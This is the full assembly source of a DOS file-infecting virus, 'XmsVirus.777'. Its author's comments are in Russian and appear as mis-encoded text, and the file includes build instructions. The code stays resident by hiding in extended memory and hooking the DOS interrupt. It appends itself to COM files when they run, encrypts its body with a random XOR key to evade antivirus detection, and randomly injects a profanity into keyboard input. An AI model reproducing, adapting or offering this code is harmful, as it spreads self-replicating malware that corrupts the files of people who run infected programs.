   ; COMMENT %
   ;
   ;    COM.XMS-TSR.RDA-CRYPT. The basic part of virus is placed
   ;    into XMS, but there is a little loader into DOS memory. If it's
   ;    necessary, loader places XMS part of virus into the DOS memory,
   ;    executes it and then frees allocated DOS memory.
   ;
   ;    *ã ç¥, ¥ ¦¤ «¨,  ¢¥à®¥? *® ¥  ¤¥©â¥áì - ®â ¬¥ï â ª ¯à®áâ® ¥ ¨§¡ ¢¨-
   ; â¥áì. ˆâ ª, ¢ëè¥« ¬®© ®ç¥à¥¤®© ¯à®¤ãªâ ¯®¤ DOS, ¨, ª ª ¢á¥£¤ , á ¨§¢à â ¬¨.
   ; ‘à §ã å®çã áª § âì, çâ® ï ¥£®  ¯¨á « §  á¥£®¤ïè¨© ¤¥ì ¯à®áâ® ®â ¥åã© ¤¥-
   ; « âì. € çâ® ¢ë å®â¥«¨? Ÿ ¢á¥ ¯¨èã ®â ¥åã© ¤¥« âì. ‚®â ¢ë á ¬¨ â® ¤«ï ç¥£® ¯¨-
   ; è¨â¥ (¥á«¨ ¯¨è¨â¥ ¢®®¡é¥)? *ã ¤  « ¤®, ¥ ®¡ íâ®¬ á¥©ç á à¥çì. *¥çì á¥©ç á
   ; ¯®©¤¥â ® ¢®§¬®¦®áâïå ¤ ®£® ¯à®¤ãªâ .
   ;
   ;    1. ‚¨àãá åà ¨â á¢®î à¥§¨¤¥âãî ª®¯¨î ¥ £¤¥-¨¡ã¤ì,   ¢ XMS. "*® ª ª ¦¥
   ;       ® â®£¤  ¬®¦¥â à ¡®â âì, à § ¢ à¥ «ì®¬ à¥¦¨¬¥ ã¯à ¢«¥¨¥ âã¤  ¯¥à¥¤ âì
   ;       ¥«ì§ï?" - ¢®§à §¨â¥ ¢ë ¨ ¡ã¤¥â¥ ¯à ¢ë. •¨âà®áâì ¢ â®¬, çâ® ¢¨àãá ®áâ ¢-
   ;       «ï¥â ¢ ®¡ëç®© ¯ ¬ïâì ¥¡®«ìè®© ¯®¤£àã§ç¨ª ¨ ãáâ  ¢«¨¢ ¥â   ¥£® ¢¥ªâ®à
   ;       Int 21h. *â®â ¯®¤£àã§ç¨ª ¯à¨ ¥®¡å®¤¨¬®áâ¨ ¢ë¤¥«ï¥â ¢ ®¡ëç®© ¯ ¬ïâ¨ ¯à®-
   ;       áâà áâ¢®, ª®¯¨àã¥â âã¤  á¢®© ª®¤ ¨§ XMS, ¯¥à¥¤ ¥â ¥¬ã ã¯à ¢«¥¨¥,   § -
   ;       â¥¬ ®á¢®¡®¦¤ ¥â ¯ ¬ïâì. Ž â®¬, ª ª à ¡®â ¥â ¢á¥ íâ® ¤¥«®, ¥âàã¤® à §®-
   ;       ¡à âìáï, ¯®á¬®âà¥¢ ¨áå®¤¨ª. „«ï á¯à ¢ª¨: ¤®áâã¯ ª XMS ®áãé¥áâ¢«ï¥âáï ç¥-
   ;       à¥§ ¤à ©¢¥à HIMEM.SYS, ª®â®àë©, ¥áâ¥áâ¢¥®, ¤®«¦¥ ¡ëâì ãáâ ®¢«¥. ‚¨-
   ;       àãá ª®àà¥ªâ® à ¡®â ¥â ¯®¤ Windows (â ¬ ¤®áâã¯ ª XMS ¢á¥£¤  ®âªàëâ).
   ;
   ;    2. ‚¨àãá § è¨äà®¢  á ¯à¨¬¥¥¨¥¬ ã¯à®é¥®£® RDA (Radnom Decoding
   ;       Algoritm). „«ï â¥å, ªâ® ¢ â ª¥: RDA - íâ®  «£®à¨â¬ è¨äà®¢ª¨, ¯à¨ ª®â®-
   ;       à®¬ ª«îç *… á®åà ï¥âáï. "*ã ¨ ª ª ¦¥ âë â®£¤  á®¡¨à ¥èìáï ¯à®¨§¢®¤¨âì
   ;       à áè¨äà®¢ªã?" - á«ëè âìáï  á¬¥è«¨¢ë¥ ¢®¯«¨ « ¬¥à®¢. € ®ç¥ì ¯à®áâ®: ª®¥-
   ;       ª ª ï ¨ä®à¬ æ¨ï ®¡ ¨áå®¤®¬ ª®¤¥ ¢á¥-â ª¨ ®áâ ¥âáï - ¥£® ª®âà®«ì ï
   ;       áã¬¬ . „«ï â®£®, çâ®¡ë à áè¨äà®¢ âì ª®¤,  ¤® ¡à âì ¢á¥ ª«îç¨ ¯®¤àï¤ (¢
   ;       íâ®¬ ¢¨àãá¥ ®¨ ¡¥àãâáï ¨§ ¯®àâ  â ©¬¥à ) ¨ à áè¨äà®¢ë¢ âì ¤® â¥å ¯®à,
   ;       ¯®ª  ª®âà®«ì ï áã¬¬  ¥ á®¢¯ ¤¥â. *¥ «ì®   íâ® ãå®¤¨â á®¢á¥¬ ¥¬®£®
   ;       ¢à¥¬¥¨, § â®  â¨¢¨àãáë á ¨å í¢à¨áâ¨ª ¬¨ § âëª îâáï. Ž¤ ª® § îé¨© ç¥-
   ;       «®¢¥ª ¬®¦¥â á¯à®á¨âì: "€ ¥ ¬®¦¥â «¨ ¯®«ãç¨âáï â ª, çâ® ª®âà®«ì ï áã¬¬ 
   ;       á®¢¯ ¤¥â, ® ª®¤ ¯à¨ íâ®¬ ¡ã¤¥â à áè¨äà®¢  ¥¯à ¢¨«ì®?" ’¥®à¥â¨ç¥áª¨ -
   ;       ¢¯®«¥ ¬®¦¥â, ® ¢¥à®ïâ®áâì íâ®£® ®ç¥ì ¬ « . Šáâ â¨, ¥á«¨ ¢§¤ã¬ ¥â¥
   ;       çâ®-â® ¬¥ïâì ¢ ¢¨àãá¥, ¥ § ¡ã¤ìâ¥ ¯®¤ª®àà¥ªâ¨à®¢ âì ª®âà®«ìãî áã¬¬ã.
   ;       Š ª íâ® á¤¥« âì? ‡ îé¨© ç¥«®¢¥ª à §¡¥à¥âáï. *® ¥á«¨ âë - ¬¥«ª¨© « ¬¥à,
   ;       ª®â®àë© ¯à®áâ® å®ç¥â ¯®¬¥ïâì ¬®© ª®¯¨à ©â, â® ¯¨§¤ã© ®âáî¤    åã©.
   ;
   ;    3. ‚¨àãá áâ ¤ àâ® § à ¦ ¥â COM ä ©«ë, ¤®¯¨áë¢ ïáì ¢ ª®¥æ. „«¨  § à ¦¥-
   ;       ëå ä ©«®¢ ã¢¥«¨ç¨¢ ¥âáï   777 ¡ ©â. Ž¡à ¡ âë¢ ¥â ä ©«ë á  âà¨¡ãâ®¬
   ;       "Read Only". *¥ ¨§¬¥ï¥â ¢à¥¬ï á®§¤ ¨ï ¨  âà¨¡ãâë ä ©« . *¥ £«îç¨â  
   ;       § é¨é¥ëå ®â § ¯¨á¨ ¤¨áª¥â å. Š®àà¥ªâ® § à ¦ ¥â COM ä ©«ë ¤«ï Windows -
   ;       ENUNS, RUSNS ¨ â.¯. - ® ¢¬¥áâ® íâ¨å á¨£ âãà § ¯¨áë¢ ¥â "*‹ŸNS" (ªáâ â¨,
   ;       íâ® â ª¦¥ ¨á¯®«ì§ã¥âáï ¤«ï ¯à®¢¥àª¨ § à ¦¥®áâ¨ ä ©« ).
   ;
   ;    4. ‚¨àãá ®¯à¥¤¥«ï¥â  ¤à¥á  áâ®ïé¥£® ®¡à ¡®âç¨ª  Int 21h á ¯®¬®éìî PSP. ‚
   ;       PSP:[6]  å®¤¨âáï ¤ «ìë©  ¤à¥á, ª®â®àë© ãª §ë¢ ¥â ªã¤ -â® ¢ DOS, ® íâ®
   ;       ¥ â®, çâ®  ¬ ã¦®. Ž¡ëç® â ¬ «¥¦ â ¥áª®«ìª® ¤ «ì¨å JMP-®¢, ¨ ¬ë
   ;       ¯à®å®¤¨¬ ¯® ¨å æ¥¯®çª¥,   § â¥¬ ¨é¥¬ ®¡à ¡®âç¨ª Int 21h ¯® á¨£ âãà¥. ‚
   ;       á«ãç ¥ ¥ã¤ ç¨ ¡¥à¥¬  ¤à¥á ¨§ â ¡«¨æë ¢¥ªâ®à®¢.
   ;
   ;    5. ‚¨àãá ¯¥à¥å¢ âë¢ ¥â â ª¦¥ ¯à¥àë¢ ¨¥ ª« ¢¨ âãàë ¨ á ¢¥à®ïâ®áâìî 1/9
   ;       ¢áâ ¢«ï¥â ¯®á«¥ § ¯ïâ®© á«®¢® "¡«ï".
   ;
   ;                                   DJ Sadovnikov (http://i.am/djsad), 11.07.2000
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;           Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM 4.1+
   ;
   ;              tasm /m xmsvirus.asm
   ;              tlink /t /x xmsvirus.obj
   ;              del xmsvirus.com
   ;
   ;
   ;           ” ©«ë ¨§  àå¨¢ :
   ;
   ;              xmsvirus.asm  14600 (¨áå®¤¨ª ¢¨àãá )
   ;              xmsvirus.com    800 (¡¨ à¨ª ¢¨àãá )
   ; %
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .286
   Code        segment
           assume  cs:Code, ds:Code
           org 100h


   Start:      db  0E9h
           dw  Virus-$-2

           mov ah, 9
           mov dx, offset Msg
           int 21h
           ret

   Msg     db  'Virus is OK$'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                            *€—€‹Ž ‚ˆ*“‘€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   msr     macro   reg1, reg2
           push    reg2
           pop reg1
           endm


   Virus:      pusha
           push    ds es

           call    GetIP
   GetIP:      pop di
           sub di, GetIP-Virus


           lea si, [Crypted-Virus+di]
   L0:     mov cx, EndCrypt-Crypted
           in  al, 40h


   ;[* áè¨äà®¢ë¢ ¥¬ ¢¨àãá á«ãç ©ë¬ ª«îç¥¬]

           push    cx
   L1:     xor ds:[si], al
           inc si
           loop    L1
           pop cx


   ;[‘ç¨â ¥¬ ª®âà®«ìãî áã¬¬ã]

           xor ax, ax
   L2:     dec si
           add al, ds:[si]
           adc ah, 0
           loop    L2


   ;[…á«¨ CRC ¥ á®¢¯ « , ¯à®¡ã¥¬ ¤àã£®© ª«îç]

   CRC:        cmp ax, 121Eh
           jne L0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‚®ááâ  ¢«¨¢ ¥¬ ¯¥à¢ë¥ âà¨ ¡ ©â  § à ¦¥®© ¯à®£à ¬¬ë]

   Crypted:    mov ax, ds:[Old3b-Virus+di]
           mov ds:[100h], ax
           mov al, ds:[Old3b+2-Virus+di]
           mov ds:[102h], al


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           mov ax, 0ABCDh
           int 21h
           cmp ax, 0CDABh
           jne Install


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ § à ¦¥®© ¯à®£à ¬¬¥]

   Exit:       pop es ds
           popa

           push    100h
           ret


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¤à ©¢¥à  XMS]

   Install:    mov ax, 4300h
           int 2Fh
           cmp al, 80h
           jne Exit


   ;[*®«ãç ¥¬  ¤à¥á ¬¥¥¤¦¥à  XMS]

           mov ax, 4310h
           int 2Fh
           mov ds:[DrXMS-Virus+di], bx
           mov ds:[DrXMS+2-Virus+di], es


   ;[‚ë¤¥«ï¥¬ ¡«®ª ¢ XMS]

           mov ah, 09h
           mov dx, CodeMem
           call    dword ptr [DrXMS-Virus+di]
           test    ax, ax
           jz  Exit


   ;[* áâà ¨¢ ¥¬ ¯®«ï áâàãªâãà ¯¥à¥áë«ª¨]

           mov ds:[DOStoXMS+06h-Virus+di], di
           mov ds:[DOStoXMS+08h-Virus+di], cs
           mov ds:[DOStoXMS+0Ah-Virus+di], dx
           mov ds:[XMStoDOS+04h-Virus+di], dx


   ;[Š®¯¨àã¥¬ ¢¨àãá ¢ XMS]

           mov ah, 0Bh
           lea si, [DOStoXMS-Virus+di]
           call    dword ptr [DrXMS-Virus+di]
           test    ax, ax
           jz  Exit


   ;[*®«ãç ¥¬ à §¬¥à â¥ªãé¥£® ¡«®ª  ¯ ¬ïâ¨]

           mov ax, cs
           dec ax
           mov ds, ax
           mov bx, ds:[3]
           sub bx, LoaderMem+1


   ;[“ª®à ç¨¢ ¥¬ â¥ªãé¨© ¡«®ª ¯ ¬ïâ¨]

           mov ah, 4Ah
           msr es, cs
           int 21h
           jc  Exit


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;            * å®¦¤¥¨¥  ¤à¥á   áâ®ïé¥£® ®¡à ¡®âç¨ª  Int 21h
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[ˆé¥¬ â®çªã ¢å®¤  ¢ ®¡à ¡®âç¨ª Int 21h]

           lds bx, cs:[6]
   Trace:      cmp ds:[bx], byte ptr 0EAh
           jne Check1
           lds bx, ds:[bx+1]
           jmp Trace


   ;[*¥à¢ë© ¢®§¬®¦ë© ¢ à¨ â ®¡à ¡®âç¨ª  Int 21h]

   Check1:     cmp ds:[bx], 9090h
           jne Check2
           sub bx, 32h
           cmp ds:[bx], 9090h
           je  Found
           jmp NotFound


   ;[‚â®à®© ¢®§¬®¦ë© ¢ à¨ â ®¡à ¡®âç¨ª  Int 21h]

   Check2:     cmp ds:[bx], 2E1Eh
           jne NotFound
           add bx, 25h
           cmp ds:[bx], 80FAh
           je  Found


   ;[‚ á«ãç ¥ ¥ã¤ ç¨ ¡¥à¥¬  ¤à¥á ¨§ â ¡«¨æë ¢¥ªâ®à®¢]

   NotFound:   mov ax, 3521h
           int 21h
           msr ds, es


   ;[‘®åà ï¥¬  ¤à¥á ¢ Int 65h]

   Found:      mov ax, 2565h
           mov dx, bx
           int 21h

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‘®åà ï¥¬  ¤à¥á áâ à®£® ®¡à ¡®âç¨ª  Int 21h]

           mov ax, 3521h
           int 21h
           msr ds, cs
           mov ds:[Ofs21h-Virus+di], bx
           mov ds:[Seg21h-Virus+di], es


   ;[‘®åà ï¥¬  ¤à¥á áâ à®£® ®¡à ¡®âç¨ª  Int 09h]

           mov ax, 3509h
           int 21h
           mov ds:[Ofs09h-Virus+di], bx
           mov ds:[Seg09h-Virus+di], es


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï Loader]

           mov ah, 48h
           mov bx, LoaderMem
           int 21h
           jc  Exit$


   ;[*®¬¥ç ¥¬ ¡«®ª ¯ ¬ïâ¨ ª ª á¨áâ¥¬ãî ®¡« áâì]

           push    ax
           dec ax
           mov ds, ax
           mov ds:[1], word ptr 8
           pop es


   ;[Š®¯¨àã¥¬ Loader ¢ ¢ë¤¥«¥ãî ¯ ¬ïâì]

           mov cx, LoaderSize
           lea si, [Loader-Virus+di]
           xor di, di
           msr ds, cs
           cld
           rep movsb


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 21h]

           mov ax, 2521h
           xor dx, dx
           msr ds, es
           int 21h


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 09h]

           mov ax, 2509h
           mov dx, Int09h-Loader
           int 21h
   Exit$:      jmp Exit


   ;[‘âàãªâãà  ¤«ï ¯¥à¥áë«ª¨ ¤ ëå ¨§ DOS-¯ ¬ïâ¨ ¢ XMS]

   DOStoXMS    dd  CodeSize    ; +00h ¤«¨  ¯¥à¥áë« ¥¬ëå ¤ ëå
           dw  0       ; +04h ¤®«¦® ¡ëâì à ¢® ã«î
           dw  0       ; +06h á¬¥é¥¨¥ ¤ ëå ¢ DOS-¯ ¬ïâ¨
           dw  0       ; +08h á¥£¬¥â ¤ ëå ¢ DOS-¯ ¬ïâ¨
           dw  0       ; +0Ah ®¬¥à æ¥«¥¢®£® XMS-¡«®ª 
           dd  0       ; +0Ch á¬¥é¥¨¥ ¢ æ¥«¥¢®¬ XMS-¡«®ª¥

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                LOADER
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Loader:     cmp ax, 0ABCDh
           jne NotTest
           xchg    ah, al
           iret


   NotTest:    pusha
           push    ds es

           cmp ax, 4B00h
           jne Quit21h


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¢¨àãá ]

           mov ah, 48h
           mov bx, VirMem
           int 65h
           jc  Quit21h
           mov cs:[XMStoDOS+0Eh-Loader], ax


   ;[*®¬¥ç ¥¬ ¡«®ª ¯ ¬ïâ¨ ª ª á¨áâ¥¬ãî ®¡« áâì]

           push    ax
           dec ax
           mov es, ax
           mov es:[1], word ptr 8
           pop es


   ;[Š®¯¨àã¥¬ ¢¨àãá ¨§ XMS ¢ ¡ §®¢ãî ¯ ¬ïâì]

           push    ds
           mov ah, 0Bh
           mov si, XMStoDOS-Loader
           msr ds, cs
           db  9Ah
   DrXMS:      dd  0
           pop ds
           test    ax, ax
           jz  FreeMem


   ;[Žâ¤ ¥¬ ¢¨àãáã ã¯à ¢«¥¨¥]

           push    cs
           push    FreeMem-Loader
           push    es
           push    Int21h-Virus
           retf


   ;[Žá¢®¡®¦¤ ¥¬ ¡«®ª ¢ ¡ §®¢®© ¯ ¬ïâ¨]

   FreeMem:    mov ah, 49h
           int 65h


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ ¤ «ìè¥ ¯® æ¥¯®çª¥]

   Quit21h:    pop es ds
           popa

           db  0EAh
   Ofs21h      dw  0
   Seg21h      dw  0


   ;[‘âàãªâãà  ¤«ï ¯¥à¥áë«ª¨ ¤ ëå ¨§ XMS ¢ DOS-¯ ¬ïâì]

   XMStoDOS    dd  CodeSize    ; +00h ¤«¨  ¯¥à¥áë« ¥¬ëå ¤ ëå
           dw  0       ; +04h ®¬¥à XMS-¡«®ª 
           dd  0       ; +06h á¬¥é¥¨¥ ¤ ëå ¢ XMS-¡«®ª¥
           dw  0       ; +0Ah ¤®«¦® ¡ëâì à ¢® ã«î
           dw  0       ; +0Ch æ¥«¥¢®¥ á¬¥é¥¨¥ ¢ DOS-¯ ¬ïâ¨
           dw  0       ; +0Eh æ¥«¥¢®© á¥£¬¥â ¢ DOS-¯ ¬ïâ¨

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int09h:     pusha


   ;[*à®¢¥àï¥¬, ª ªãî ª« ¢èã  ¦ « î§¥à]

           in  al, 60h
           cmp al, 33h
           jne Quit09h


   ;[‚¥à®ïâ®áâì ¢ë¯®«¥¨ï § ¯®¤« ]

           in  al, 40h
           and al, 00000011b
           cmp al, 00000011b
           jne Quit09h


   ;[‡ ¯¨áë¢ ¥¬ ¢ ¡ãää¥à á«®¢® ", ¡«ï"]

           xor bx, bx
   L3:     mov ah, 5
           mov ch, 0
           mov cl, cs:[Bla-Loader+bx]
           int 16h
           cmp al, 1
           je  Quit09h
           inc bx
           cmp bx, 5
           jne L3

   Quit09h:    popa

           db  0EAh
   Ofs09h      dw  0
   Seg09h      dw  0

   Bla     db  ', ¡«ï'

   LoaderSize  =   $-Loader
   LoaderMem   =   LoaderSize/16 + 1

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                          Ž**€*Ž’—ˆŠ INT 21h
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int24h:     mov al, 3
           iret


   Int21h:     push    es


   ;[‘®åà ï¥¬ ¢¥ªâ®à Int 24h]

           mov ax, 3524h
           int 65h
           push    es
           push    bx


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 24h]

           push    ds dx
           mov ax, 2524h
           mov dx, Int24h-Virus
           msr ds, cs
           int 65h
           pop dx ds


   ;[‘®åà ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4300h
           int 65h
           jc  Error
           push    cx
           push    dx
           push    ds


   ;[Ž¡ã«ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4301h
           xor cx, cx
           int 65h
           jc  RestAttr


   ;[Žâªàë¢ ¥¬ ä ©«]

           mov ax, 3D02h
           int 65h
           jc  RestAttr
           xchg    bx, ax


   ;[‘®åà ï¥¬ ¢à¥¬ï ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

           mov ax, 5700h
           int 65h
           jc  Close
           push    cx
           push    dx


   ;[‘ç¨âë¢ ¥¬ ¯¥à¢ë¥ âà¨ ¡ ©â ]

           mov ah, 3Fh
           mov cx, 3
           mov dx, Old3b-Virus
           msr ds, cs
           int 65h
           jc  RestTime


   ;[*à®¢¥àï¥¬ â¨¯ ä ©« ]

           cmp ds:[Old3b-Virus], 'ZM'
           jne ComFile

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‚®ááâ  ¢«¨¢ ¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

   RestTime:   mov ax, 5701h
           pop dx
           pop cx
           int 65h


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close:      mov ah, 3Eh
           int 65h


   ;[‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« ]

   RestAttr:   mov ax, 4301h
           pop ds
           pop dx
           pop cx
           int 65h


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¢¥ªâ®à Int 24h]

   Error:      mov ax, 2524h
           pop dx
           pop ds
           int 65h

           pop es
           retf

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   7 ¯®§¨æ¨© ®â ª®æ  ä ©« ]

   ComFile:    mov ax, 4202h
           mov cx, 0FFFFh
           mov dx, 0FFF9h
           int 65h
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬ 7 ¡ ©â]

           mov ah, 3Fh
           mov cx, 7
           mov dx, Buffer-Virus
           int 65h
           jc  RestTime


   ;[*à®¢¥àï¥¬ § à ¦¥®áâì ä ©«  ¨ ª®àà¥ªâ¨àã¥¬ XXXNS]

           cmp ds:[Buffer-Virus], '‹*'
           je  RestTime
           mov ax, ds:[Buffer+5-Virus]
           add ax, CodeSize
           mov ds:[XXXNS+5-Virus], ax


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢ ª®¥æ ä ©« ]

           mov ax, 4202h
           xor cx, cx
           xor dx, dx
           int 65h
           jc  RestTime


   ;[*à®¢¥àï¥¬ ¤«¨ã ä ©«  ¨ ¢ëç¨á«ï¥¬  ¤à¥á ¯¥à¥å®¤ ]

           or  dx, dx
           jnz RestTime
           cmp ax, 0FF00h-CodeSize
           jae RestTime
           sub ax, 3
           jc  RestTime
           mov ds:[New3b+1-Virus], ax


   ;[Š®¯¨àã¥¬ ¢¨àãá ¢ ¡ãää¥à]

           xor si, si
           mov cx, CodeSize
   L4:     mov al, ds:[si]
           mov ds:[Buffer-Virus+si], al
           inc si
           loop    L4


   ;[‚ëç¨á«ï¥¬ ª®âà®«ìãî áã¬¬ã]

           xor ax, ax
           mov cx, EndCrypt-Crypted
           mov si, (Buffer-Virus)+(EndCrypt-Virus)
           push    cx
   L5:     dec si
           add al, ds:[si]
           adc ah, 0
           loop    L5
           mov ds:[(Buffer-Virus)+(CRC+1-Virus)], ax
           pop cx


   ;[˜¨äàã¥¬ ¢¨àãá]

           in  al, 40h
   L6:     xor ds:[si], al
           inc si
           loop    L6


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá ¢ ä ©«]

           mov ah, 40h
           mov cx, CodeSize
           mov dx, Buffer-Virus
           int 65h
           jc  RestTime$


   ;[*¥à¥¬¥é ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           mov ax, 4200h
           xor cx, cx
           xor dx, dx
           int 65h
           jc  RestTime$


   ;[‡ ¯¨áë¢ ¥¬ ª®¬ ¤ã ¯¥à¥å®¤    ¢¨àãá]

           mov ah, 40h
           mov cx, 3
           mov dx, New3b-Virus
           int 65h
   RestTime$:  jmp RestTime

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                „€**›…
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   VirName     db  'XmsVirus.777 -- Copyright (c) by DJ Sadovnikov'
   Old3b       db  90h,90h,90h
   New3b       db  0E9h,0,0

   EndCrypt    label

   XXXNS       db  '*‹ŸNS',0,0

